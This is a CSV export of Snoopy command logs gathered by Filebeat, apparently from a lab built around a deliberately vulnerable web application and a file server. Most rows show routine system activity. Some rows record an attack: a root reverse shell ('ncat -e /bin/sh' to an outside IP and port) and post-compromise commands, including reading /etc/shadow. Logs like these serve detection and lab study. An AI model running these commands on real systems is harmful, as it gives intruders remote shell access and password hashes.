"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version",command,cwd,"ecs.version","event.dataset","event.ingested",filename,"host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,sid,tty,uid
"Oct 24, 2022 @ 23:30:11.036",KuCdCoQBDsc6tFfSm5TG,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/sbin/exim4 -Mc 1omzOr-0014mf-OQ","/var/spool/exim4","8.0.0",snoopy,"Oct 24, 2022 @ 23:30:12.038","/usr/sbin/exim4","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","663,300","[uid:105 sid:256722 tty:(none) cwd:/var/spool/exim4 filename:/usr/sbin/exim4]: /usr/sbin/exim4 -Mc 1omzOr-0014mf-OQ",256722,"(none)",105
"Oct 24, 2022 @ 23:30:11.036","K-CdCoQBDsc6tFfSm5TG",".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/sbin/sshd -R","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:30:12.038","/usr/sbin/sshd","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","663,416","[uid:0 sid:256729 tty:(none) cwd:/ filename:/usr/sbin/sshd]: /usr/sbin/sshd -R",256729,"(none)",0
"Oct 24, 2022 @ 23:30:11.036",LOCdCoQBDsc6tFfSm5TG,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:30:12.038","/usr/bin/env","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","663,495","[uid:0 sid:256729 tty:(none) cwd:/ filename:/usr/bin/env]: /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d",256729,"(none)",0
"Oct 24, 2022 @ 23:30:11.036",LeCdCoQBDsc6tFfSm5TG,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/etc/update-motd.d/10-uname","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:30:12.038","/etc/update-motd.d/10-uname","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","663,678","[uid:0 sid:256729 tty:(none) cwd:/ filename:/etc/update-motd.d/10-uname]: /etc/update-motd.d/10-uname",256729,"(none)",0
"Oct 24, 2022 @ 23:30:11.036",LuCdCoQBDsc6tFfSm5TG,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","uname -snrvm","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:30:12.038","/bin/uname","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","663,780","[uid:0 sid:256729 tty:(none) cwd:/ filename:/bin/uname]: uname -snrvm",256729,"(none)",0
"Oct 24, 2022 @ 23:30:11.035",KeCdCoQBDsc6tFfSm5TG,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","ncat -e /bin/sh 123.123.123.250 9002","/root","8.0.0",snoopy,"Oct 24, 2022 @ 23:30:12.038","/usr/bin/ncat","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","663,199","[uid:0 sid:256719 tty:(none) cwd:/root filename:/usr/bin/ncat]: ncat -e /bin/sh 123.123.123.250 9002",256719,"(none)",0
"Oct 24, 2022 @ 23:29:28.566","5d-cCoQBDsc6tFfS9YDg",".ds-filebeat-8.4.3-2022.10.24-000001","-","5d0cb3da-42a8-45c7-b1a4-de4d1318078a",fileserver,"ea2911dd-2454-43d6-8683-c96a80973fad",fileserver,filebeat,"8.4.3","cat /etc/shadow","/tmp","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:29.568","/bin/cat","x86_64",false,fileserver,40beb5eb909e171860ceee669da56e1d,"10.10.10.30","02:42:0a:0a:0a:1e",fileserver,jessie,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"8 (jessie)",filestream,"/var/log/snoopy.log","12,854","[uid:0 sid:1 tty:(none) cwd:/tmp filename:/bin/cat]: cat /etc/shadow",1,"(none)",0
"Oct 24, 2022 @ 23:29:22.563","Tt-cCoQBDsc6tFfS3kts",".ds-filebeat-8.4.3-2022.10.24-000001","-","5d0cb3da-42a8-45c7-b1a4-de4d1318078a",fileserver,"ea2911dd-2454-43d6-8683-c96a80973fad",fileserver,filebeat,"8.4.3","/bin/sh","/tmp","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:23.564","/bin/sh","x86_64",false,fileserver,40beb5eb909e171860ceee669da56e1d,"10.10.10.30","02:42:0a:0a:0a:1e",fileserver,jessie,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"8 (jessie)",filestream,"/var/log/snoopy.log","12,668","[uid:0 sid:1 tty:(none) cwd:/tmp filename:/bin/sh]: /bin/sh",1,"(none)",0
"Oct 24, 2022 @ 23:29:22.563","T9-cCoQBDsc6tFfS3kts",".ds-filebeat-8.4.3-2022.10.24-000001","-","5d0cb3da-42a8-45c7-b1a4-de4d1318078a",fileserver,"ea2911dd-2454-43d6-8683-c96a80973fad",fileserver,filebeat,"8.4.3",whoami,"/tmp","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:23.564","/usr/bin/whoami","x86_64",false,fileserver,40beb5eb909e171860ceee669da56e1d,"10.10.10.30","02:42:0a:0a:0a:1e",fileserver,jessie,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"8 (jessie)",filestream,"/var/log/snoopy.log","12,728","[uid:0 sid:1 tty:(none) cwd:/tmp filename:/usr/bin/whoami]: whoami",1,"(none)",0
"Oct 24, 2022 @ 23:29:22.563","UN-cCoQBDsc6tFfS3kts",".ds-filebeat-8.4.3-2022.10.24-000001","-","5d0cb3da-42a8-45c7-b1a4-de4d1318078a",fileserver,"ea2911dd-2454-43d6-8683-c96a80973fad",fileserver,filebeat,"8.4.3",id,"/tmp","8.0.0",snoopy,"Oct 24, 2022 @ 23:29:23.564","/usr/bin/id","x86_64",false,fileserver,40beb5eb909e171860ceee669da56e1d,"10.10.10.30","02:42:0a:0a:0a:1e",fileserver,jessie,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"8 (jessie)",filestream,"/var/log/snoopy.log","12,795","[uid:0 sid:1 tty:(none) cwd:/tmp filename:/usr/bin/id]: id",1,"(none)",0
